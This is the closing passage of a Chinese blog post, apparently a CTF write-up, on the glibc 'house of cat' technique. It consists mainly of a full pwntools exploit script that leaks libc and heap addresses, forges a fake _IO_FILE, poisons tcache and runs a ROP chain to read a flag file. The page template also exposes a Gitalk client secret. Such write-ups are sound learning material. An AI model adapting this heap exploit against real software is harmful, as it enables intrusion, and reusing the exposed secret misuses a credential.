+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./CAT_DE&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;182.92.237.102&quot;,2122)</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;input your car choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;content:&quot;</span>,<span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;input your car choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;input your car choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;input your car choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">b&quot;flag&quot;</span>)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;context:&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x0a&quot;</span>)</span><br><span class="line">libcbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span>-<span class="number">0xf30</span></span><br><span class="line">p.recv(<span class="number">10</span>)</span><br><span class="line">heapaddr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapaddr))</span><br><span class="line"></span><br><span class="line">rdi=libcbase+<span class="number">0x000000000002a3e5</span></span><br><span class="line">rsi=libcbase+<span class="number">0x000000000002be51</span></span><br><span class="line">rdxr12=libcbase+<span class="number">0x000000000011f2e7</span></span><br><span class="line">ret=libcbase+<span class="number">0x0000000000029cd6</span></span><br><span class="line">rax=libcbase+<span class="number">0x0000000000045eb0</span></span><br><span class="line">stderr=libcbase+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">setcontext=libcbase+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">close=libcbase+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscallret=libcbase+<span class="number">0xea549</span></span><br><span class="line"></span><br><span class="line">ioaddr=heapaddr+<span class="number">0x290</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(ioaddr+<span class="number">0xb0</span>) <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># _IO_save_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapaddr+<span class="number">0x200</span>)  <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(ioaddr+<span class="number">0x30</span>) <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2170d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(ioaddr+<span class="number">0x40</span>)  <span class="comment"># rax2</span></span><br><span class="line">flagaddr=heapaddr+<span class="number">0x1e250</span></span><br><span class="line">payload1=fake_IO_FILE+p64(flagaddr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heapaddr+<span class="number">0x6c0</span>+<span class="number">0x10</span>)+p64(ret)<span class="comment">#heapaddr+0x2040ropaddr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x3f8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#14</span></span><br><span class="line">edit(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)+p64(heapaddr+<span class="number">0x1970</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x3f0</span>+p64(<span class="number">0x4f0</span>)+<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapaddr&gt;&gt;<span class="number">12</span>))</span><br><span class="line">m=(heapaddr&gt;&gt;<span class="number">12</span>)+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line">l=m^stderr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====&gt;&quot;</span>+<span class="built_in">hex</span>(stderr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(l))</span><br><span class="line">edit(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(libcbase+<span class="number">0x21b100</span>)*<span class="number">2</span>+p64(heapaddr+<span class="number">0x1970</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0xb1</span>)+p64(l))</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload1)</span><br><span class="line">edit(<span class="number">6</span>,p64(heapaddr+<span class="number">0x290</span>))</span><br><span class="line">payload=p64(rdi)+p64(flagaddr)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdxr12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(rax)+p64(<span class="number">2</span>)+p64(syscallret)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(heapaddr+<span class="number">0x200</span>)+p64(rdxr12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">0</span>)+p64(syscallret)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(heapaddr+<span class="number">0x200</span>)+p64(rdxr12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(rax)+p64(<span class="number">1</span>)+p64(syscallret)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0x2000</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x2000</span>-<span class="number">0x8</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="number">24</span>,<span class="string">b&quot;flag\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*(<span class="number">0x2000</span>-<span class="number">4</span>))</span><br><span class="line">p.sendlineafter( <span class="string">b&#x27;input your car choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>文章参考<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/myxa/p/18228800">高版本libc堆fd指针绕过 - 蟇窳瓨 - 博客园 (cnblogs.com)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm">原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51251108/article/details/127290280">house of cat 学习-CSDN博客</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xiaoton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/27/house-of-cat/">http://example.com/2024/07/27/house-of-cat/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cccchen</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/07/29/SY8kXZbsKBxePGz.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/07/23/house-of-kiwi/" title="house of kiwi"><img class="cover" src="https://s2.loli.net/2024/07/24/BOoJmtwkT9brnIH.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">house of kiwi</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Gitalk</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xiaoton</div><div class="author-info__description">chen</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chenxiaoton/chenxiaoton.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/27/house-of-cat/" title="house of cat"><img src="https://s2.loli.net/2024/07/29/SY8kXZbsKBxePGz.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="house of cat"/></a><div class="content"><a class="title" href="/2024/07/27/house-of-cat/" title="house of cat">house of cat</a><time datetime="2024-07-27T12:12:11.000Z" title="发表于 2024-07-27 20:12:11">2024-07-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/23/house-of-kiwi/" title="house of kiwi"><img src="https://s2.loli.net/2024/07/24/BOoJmtwkT9brnIH.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="house of kiwi"/></a><div class="content"><a class="title" href="/2024/07/23/house-of-kiwi/" title="house of kiwi">house of kiwi</a><time datetime="2024-07-23T09:47:21.000Z" title="发表于 2024-07-23 17:47:21">2024-07-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/13/%E5%8A%AB%E6%8C%8164%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini-array%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB/" title="劫持64位静态链接程序fini_array进行ROP攻击"><img src="https://s2.loli.net/2024/07/13/E7mvVT9XnbMaQHr.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持64位静态链接程序fini_array进行ROP攻击"/></a><div class="content"><a class="title" href="/2024/07/13/%E5%8A%AB%E6%8C%8164%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini-array%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB/" title="劫持64位静态链接程序fini_array进行ROP攻击">劫持64位静态链接程序fini_array进行ROP攻击</a><time datetime="2024-07-13T10:20:57.000Z" title="发表于 2024-07-13 18:20:57">2024-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/12/%E6%B5%85%E8%B0%88leave-ret%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/" title="浅谈leave ret指令及其利用"><img src="https://s2.loli.net/2024/04/13/PbeucQAFiJHChVv.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浅谈leave ret指令及其利用"/></a><div class="content"><a class="title" href="/2024/04/12/%E6%B5%85%E8%B0%88leave-ret%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/" title="浅谈leave ret指令及其利用">浅谈leave ret指令及其利用</a><time datetime="2024-04-12T13:40:21.000Z" title="发表于 2024-04-12 21:40:21">2024-04-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/18/buu/" title="buu"><img src="https://t.mwm.moe/pc" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="buu"/></a><div class="content"><a class="title" href="/2024/02/18/buu/" title="buu">buu</a><time datetime="2024-02-18T05:12:51.000Z" title="发表于 2024-02-18 13:12:51">2024-02-18</time></div></div></div></div></div></div></main><footer id="footer" style="background: ture"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> xiaoton</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: 'cfa1cfd304f707c8cd02',
+      clientSecret: 'e93165dea22070e53c247b59001c5123e383d91e',
+      repo: 'chenxiaoton.github.io',
+      owner: 'chenxiaoton',
+      admin: ['chenxiaoton'],
+      id: '42919686dba15324991dcd294dc67414',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2024/07/27/house-of-cat/'
+    this.page.identifier = '/2024/07/27/house-of-cat/'
+    this.page.title = 'house of cat'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Gitalk' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script src="/js1/rphoto.js"></script><script data-pjax>obcboPic()</script><div class="aplayer no-destroy" data-id="8965008960" data-server="tencent" data-type="playlist" data-fixed="true" data-autoplay="true" data-lrcType="-1"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="ture" data-text="c,l" data-fontsize="15px" data-random="false" async="async"></script><script>(function(d, w, c) {
+    w.ChatraID = 'XQRN2Sxf9it3jkwfw';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (ture) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (ture) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"fasle"},"log":false});</script></body></html>
